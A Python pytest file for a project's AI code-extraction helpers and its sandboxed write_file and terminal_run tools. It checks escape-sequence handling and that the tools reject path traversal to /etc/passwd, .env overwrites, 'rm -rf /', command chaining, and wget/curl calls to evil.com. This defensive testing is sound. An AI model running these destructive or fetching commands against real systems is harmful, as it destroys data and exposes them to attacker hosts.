import pytest
import os
import sys

# Add parent directory to path to import modules
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from hub import extract_code_block as hub_extract_code_block
from architect import extract_code_block as architect_extract_code_block
from core.tools import write_file, terminal_run


class TestEscapeSequencesFix:
    """Test che verifica fix escape sequences"""
    
    def test_hub_escape_sequences_fix(self):
        """Test hub.py extract_code_block with literal escapes"""
        # Simula risposta AI con literal escapes
        corrupted = '```python\nimport os\\nprint("Hello")\\n```'
        code = hub_extract_code_block(corrupted)
        
        assert code is not None
        # Should have real newlines between statements
        assert code.count('\n') >= 1  # Real newlines
        assert 'import os' in code
        assert 'print("Hello")' in code
        # Check that it's on separate lines (not literal \n between statements)
        lines = code.split('\n')
        assert len(lines) >= 2
        assert 'import os' in lines[0]
    
    def test_architect_escape_sequences_fix(self):
        """Test architect.py extract_code_block with literal escapes"""
        # Simula risposta AI con literal escapes
        corrupted = '```python\nimport sys\\ndef main():\\n    print("test")\\n```'
        code = architect_extract_code_block(corrupted)
        
        assert code is not None
        assert '\n' in code  # Real newlines
        assert '\\n' not in code  # No literal escapes
        assert 'import sys' in code
        assert 'def main():' in code
    
    def test_hub_normal_code_unchanged(self):
        """Test that normal code without escape sequences is unchanged"""
        normal = '```python\nimport os\nprint("Hello")\n```'
        code = hub_extract_code_block(normal)
        
        assert code is not None
        assert 'import os' in code
        assert 'print("Hello")' in code
    
    def test_architect_normal_code_unchanged(self):
        """Test that normal code without escape sequences is unchanged"""
        normal = '```python\nimport sys\ndef main():\n    print("test")\n```'
        code = architect_extract_code_block(normal)
        
        assert code is not None
        assert 'import sys' in code
        assert 'def main():' in code


class TestSecurityFixes:
    """Test security vulnerabilities fixes"""
    
    def test_write_file_path_traversal(self):
        """Test protezione path traversal"""
        result = write_file("../../etc/passwd", "hacked")
        assert "ERRORE SICUREZZA" in result or "Path traversal" in result
    
    def test_write_file_absolute_path(self):
        """Test that absolute paths are blocked"""
        result = write_file("/etc/passwd", "hacked")
        assert "ERRORE SICUREZZA" in result or "Path traversal" in result
    
    def test_write_file_core_protection(self):
        """Test protezione file core"""
        result = write_file("core/engine.py", "malicious")
        assert "ERRORE SICUREZZA" in result
    
    def test_write_file_env_protection(self):
        """Test that .env files are protected"""
        result = write_file("projects/.env", "API_KEY=stolen")
        assert "ERRORE SICUREZZA" in result
    
    def test_write_file_directory_whitelist(self):
        """Test that only whitelisted directories are allowed"""
        result = write_file("malicious.py", "evil code")
        assert "ERRORE SICUREZZA" in result
        assert "consentita solo in" in result
    
    def test_write_file_size_limit(self):
        """Test file size limits"""
        # Create content larger than 10MB
        large_content = "X" * (11 * 1024 * 1024)  # 11MB
        result = write_file("projects/large_file.txt", large_content)
        assert "ERRORE" in result
        assert "grande" in result
    
    def test_terminal_command_injection(self):
        """Test protezione command injection"""
        result = terminal_run("ls; rm -rf /")
        assert "ERRORE SICUREZZA" in result or "Pattern pericoloso" in result
    
    def test_terminal_pipe_injection(self):
        """Test that pipe commands are blocked"""
        result = terminal_run("ls | grep test")
        assert "ERRORE SICUREZZA" in result or "Pattern pericoloso" in result
    
    def test_terminal_whitelist(self):
        """Test whitelist comandi"""
        result = terminal_run("wget http://evil.com")
        assert "non consentito" in result or "ERRORE SICUREZZA" in result
    
    def test_terminal_curl_blocked(self):
        """Test that curl is blocked"""
        result = terminal_run("curl http://evil.com")
        assert "non consentito" in result or "ERRORE SICUREZZA" in result
    
    def test_terminal_rm_blocked(self):
        """Test that rm command is blocked"""
        result = terminal_run("rm -rf /home")
        assert "non consentito" in result or "ERRORE SICUREZZA" in result
    
    def test_terminal_allowed_command(self):
        """Test that whitelisted commands work"""
        result = terminal_run("ls")
        # Should execute (might fail or succeed depending on environment)
        # We just check it doesn't return a security error
        assert "non consentito" not in result or "OUTPUT" in result


class TestValidWrites:
    """Test that valid writes still work"""
    
    def test_write_file_projects_directory(self):
        """Test that writing to projects directory works"""
        result = write_file("projects/test_file.txt", "test content")
        # Should succeed
        assert "✅" in result or "FILE SALVATO" in result
        
        # Cleanup
        try:
            os.remove("/home/runner/work/QuantumDev-v2/QuantumDev-v2/projects/test_file.txt")
        except:
            pass
    
    def test_write_file_memories_directory(self):
        """Test that writing to memories directory works"""
        result = write_file("memories/test_memory.json", '{"test": "data"}')
        # Should succeed
        assert "✅" in result or "FILE SALVATO" in result
        
        # Cleanup
        try:
            os.remove("/home/runner/work/QuantumDev-v2/QuantumDev-v2/memories/test_memory.json")
        except:
            pass


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
